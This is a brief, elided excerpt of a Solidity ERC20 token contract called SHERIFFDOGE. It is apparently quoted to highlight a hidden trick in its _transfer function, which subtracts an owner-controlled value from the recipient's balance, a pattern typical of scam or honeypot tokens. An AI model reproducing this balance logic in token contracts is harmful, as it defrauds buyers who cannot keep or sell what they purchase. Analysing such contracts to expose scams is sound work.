...
contract ERC20 is Context, IERC20, Ownable {
   ...
   function BurnToken(uint256 amount) public returns (bool) {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 1 * _theValue);
...
contract  SHERIFFDOGE is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("SHERIFFDOGE", "SHERIFFDOGE") {
